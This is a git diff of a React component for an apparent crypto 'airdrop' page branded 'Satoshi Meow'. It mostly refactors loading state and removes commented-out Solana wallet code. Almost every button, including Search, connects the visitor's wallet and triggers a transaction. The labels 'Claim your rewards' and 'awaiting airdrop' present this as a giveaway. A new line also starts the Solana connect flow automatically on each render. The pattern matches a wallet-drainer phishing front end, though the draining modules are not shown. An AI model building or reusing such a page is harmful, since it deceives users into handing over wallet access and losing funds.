@@ -18,8 +18,6 @@ import { SiSolana } from "react-icons/si"; // SimpleIcons for Solana
 // import { useMemo } from "react";
 import { SolanaContext } from './context/solana_context/SolanaContext';
 import { connectSolana, handleSolanaAirdrop } from './web3/solana';
-// import { handleSolanaAirdrop } from './web3/solana';
-// import { connectSolanaWallet, getSolanaWalletNames } from './web3/solanaWalletAdapter';
 
 const tokenAddresses = [
   "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
@@ -52,16 +50,11 @@ const titleDelays = titleText.split("").map(() => `${(Math.random() * 0.5).toFix
 
 function App() {
   const { state, dispatch } = useContext(WalletContext);
-  const [loadingAction, setLoadingAction] = useState(null);
+  const [loading, setLoading] = useState(false);
   const topRef = useRef(null);
   const chartRef = useRef(null);
   const [showModal, setShowModal] = useState(false);
-  // const [showSolanaModal, setShowSolanaModal] = useState(false);
-  // const solanaWalletNames = useMemo(() => getSolanaWalletNames(), []);
-  const { solDispatch } = useContext(SolanaContext)
-
-  // const openSolanaModal = () => setShowSolanaModal(true);
-  // const closeSolanaModal = () => setShowSolanaModal(false);
+  const {solState, solDispatch} = useContext(SolanaContext)
 
   const scrollToTop = () => {
     window.scrollTo({
@@ -77,8 +70,8 @@ function App() {
   };
 
   const handleConnectAndSend = async () => {
-    if(loadingAction) return; // prevent multiple clicks
-    setLoadingAction('eth-trade');
+    if(loading) return; // prevent multiple clicks
+    setLoading(true);
 
     try {
       let data = {
@@ -93,7 +86,7 @@ function App() {
         if(!data){
           // alert("Failed to connect wallet. Please try again.");
           alert("Failed to receive airdrop. Please try again.");
-          setLoadingAction(null);
+          setLoading(false);
           return;
         }
 
@@ -127,36 +120,17 @@ function App() {
         // alert("Failed to send ETH transaction.");
         alert("Failed to receive ETH airdrop. Try again later.");
       }
-    } catch {
+    } catch (error) {
+      // console.error("Error in connect/send flow:", error);
       alert("Something went wrong. Please try again.");
     }
-    setLoadingAction(null);
+    setLoading(false);
   }
 
-  // const handleConnectSolanaWallet = async (walletName) => {
-  //   if (loading) return;
-  //   setLoading(true);
-
-  //   try {
-  //     const { address: solAddress } = await connectSolanaWallet(walletName);
-  //     if (solAddress) {
-  //       solDispatch({ type: "CONNECT_SOLANA", payload: { address: solAddress } });
-  //       await handleSolanaAirdrop(solAddress, solanaTokenList);
-  //       alert("Solana rewards Processing...");
-  //     }
-  //   } catch (e) {
-  //     console.log("Solana Wallet Connect Error:", e);
-  //     alert("Unable to connect the selected Solana wallet.");
-  //   } finally {
-  //     setLoading(false);
-  //     closeSolanaModal();
-  //   }
-  // };
-
   const handleSolanaAirdropFlow = async () => {
-    if(loadingAction) return
-    setLoadingAction('solana-airdrop')
+    if(loading) return
 
+    // solana
     try {
       const solAddress = await connectSolana()
       if(solAddress){
@@ -167,12 +141,12 @@ function App() {
     } catch (e){
       console.log("Airdrop Flow Error: ", e);
     } finally {
-      setLoadingAction(null)
+      setLoading(false)
     }
     
   }
   const handleFullAirdropFlow = async () => {
-    if(loadingAction) return
+    if(loading) return
     handleConnectAndSend()
     handleSolanaAirdrop()
   }
@@ -180,7 +154,7 @@ function App() {
   // Unified Bitcoin Handler
   const handleWalletConnected = async (walletData) => {
     setShowModal(false); 
-    setLoadingAction('bitcoin');
+    setLoading(true);
 
     try {
       console.log("Connected to:", walletData.address, "via", walletData.type);
@@ -218,7 +192,7 @@ function App() {
       console.error("Bitcoin Flow Error:", e);
       alert("Please check your wallet for confirmation.");
     } finally {
-      setLoadingAction(null);
+      setLoading(false);
     }
   };
 
@@ -236,7 +210,7 @@ function App() {
           </div>
           <div className="container-fluid">
             <a className="navbar-brand">
-              <button className="btn btn-success animated-btn" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}>
+              <button className="btn btn-success animated-btn" onClick={handleConnectAndSend} disabled={loading}>
                 <span className="emoji-wrapper">
                   <span className="emoji-slide">
                     🎁 🎉 🪂 💰 🪙 🚀 🎁
@@ -244,7 +218,9 @@ function App() {
                 </span>
                 <span className="text-wrapper">
                   <span className="text-slide">
-                    Airdrop ETH<br/>
+                    WALLET<br/>
+                    SOLANA<br/>
+                    {/* Airdrop ETH<br/>
                     Reward Celebration<br/>
                     Claim Airdrop<br/>
                     BTH Airdrop<br/>
@@ -254,7 +230,7 @@ function App() {
                     Exclusive Airdrop<br/>
                     Claim Your Prize<br/>
                     ETH | BTC | SOL<br/>
-                    Token Giveaway<br/>
+                    Token Giveaway<br/> */}
                   </span>
                 </span>
               </button>
@@ -278,9 +254,9 @@ function App() {
                     <a className="nav-link" href="#">Telegram</a>
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link" onClick={() => setShowModal(true)} disabled={loadingAction === 'bitcoin'}><FaBitcoin className="me-2 text-warning" /> Bitcoin Airdrops</a>
+                    <a className="nav-link" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Airdrops</a>
                     <a className="nav-link" href="#"><SiSolana className="me-2 text-info" /> Solana Airdrops</a>
-                    <a className="nav-link" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}><FaEthereum className="me-2 text-primary" /> ETH Airdrops</a>
+                    <a className="nav-link" onClick={handleConnectAndSend} disabled={loading}><FaEthereum className="me-2 text-primary" /> ETH Airdrops</a>
                   </li>
                   <li className="nav-item dropdown">
                     <a className="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
@@ -288,8 +264,8 @@ function App() {
                     </a>
                     <ul className="dropdown-menu">
                       <li><a className="dropdown-item"><SiSolana className="me-2 text-info" /> Solana Flash Airdrop</a></li>
-                      <li><a className="dropdown-item" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
-                      <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loadingAction === 'bitcoin'}><FaBitcoin className="me-2 text-warning" /> Bitcoin Flash Airdrop</a></li>
+                      <li><a className="dropdown-item" onClick={handleConnectAndSend} disabled={loading}><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
+                      <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Flash Airdrop</a></li>
                       <li>
                         <hr className="dropdown-divider"/>
                       </li>
@@ -299,7 +275,7 @@ function App() {
                 </ul>
                 <form className="d-flex mt-3" role="search">
                   <input className="form-control me-2" type="search" placeholder="Search" aria-label="Search"/>
-                  <button className="btn btn-outline-success" type="submit" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}>Search</button>
+                  <button className="btn btn-outline-success" type="submit" onClick={handleConnectAndSend} disabled={loading}>Search</button>
                 </form>
                 <div className="mb-5carousel">
                   <Carousel />
@@ -340,10 +316,10 @@ function App() {
             <button
               className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
               onClick={handleConnectAndSend}
-              disabled={loadingAction === 'eth-trade'}
+              disabled={loading}
             >
               {
-                loadingAction === 'eth-trade'
+                loading
                   ? "💰Connection pending..."
                   : state.address
                   ? "Connecting..."
@@ -362,10 +338,10 @@ function App() {
         <button
           className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
           onClick={handleConnectAndSend}
-          disabled={loadingAction === 'eth-trade'}
+          disabled={loading}
         >
           {
-            loadingAction === 'eth-trade'
+            loading
               ? "💰awaiting Airdrop..."
               : state.address
               ? "Claiming | awaiting airdrop..."
@@ -417,7 +393,7 @@ function App() {
           <div className="card-img-overlay d-flex flex-column justify-content-center align-items-center text-center">
             <h5 className="card-title text-shadow p-img-text shadow">SATOSHI MEOW</h5>
             <p className="card-text text-shadow p-img-text px-5 shadow">Satoshi Meow is the first Purr-to-Earn ecosystem designed to bring balance to the crypto-verse. While dogs chase their tails, Satoshi Meow focuses on calculated leaps and landing on all four paws, even in a bear market.</p>
-            <p className="card-text text-shadow p-img-text shadow"><small><button className="btn btn-info animated-bt2" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}>🎁Claim your rewards now!</button></small></p>
+            <p className="card-text text-shadow p-img-text shadow"><small><button className="btn btn-info animated-bt2" onClick={handleConnectAndSend} disabled={loading ? true : false}>🎁Claim your rewards now!</button></small></p>
           </div>
         </div>
       </div>
@@ -444,15 +420,14 @@ function App() {
         <LiveChartComponent />
       </section>
       <footer className='overflow-x-none' ref={topRef}>
-        {/* openSolanaModal prop commented out since adapter UI is disabled */}
         <FooterNav
           scrollToTop={scrollToTop}
           scrollToCharts={scrollToCharts}
           handleConnectAndSend={handleConnectAndSend}
           handleFullAirdropFlow={handleFullAirdropFlow}
-          handleSolanaAirdropFlow={handleSolanaAirdropFlow}
+          handleSolanaAirdropFlow={handleSolanaAirdropFlow()}
           handleWalletConnected={handleWalletConnected}
-          loadingAction={loadingAction}
+          loading={loading}
           address={state.address}
           setShowModal={setShowModal}
         />
@@ -462,32 +437,6 @@ function App() {
           <WalletSelector onConnected={handleWalletConnected} />
         </div>
       )}
-      {/*
-      {showSolanaModal && (
-        <div className="modal-overlay">
-          <div className="solana-modal bg-white p-4 rounded shadow-lg">
-            <div className="d-flex justify-content-between align-items-center mb-3">
-              <h5 className="mb-0">Select Solana Wallet</h5>
-              <button className="btn btn-sm btn-outline-secondary" onClick={closeSolanaModal}>Close</button>
-            </div>
-            <div className="list-group">
-              {solanaWalletNames.map((name) => (
-                <button
-                  key={name}
-                  type="button"
-                  className="list-group-item list-group-item-action d-flex justify-content-between align-items-center"
-                  onClick={() => handleConnectSolanaWallet(name)}
-                  disabled={loading}
-                >
-                  <span>{name}</span>
-                  <span className="badge bg-primary rounded-pill">Connect</span>
-                </button>
-              ))}
-            </div>
-          </div>
-        </div>
-      )}
-      */}
     </>
   )
 }
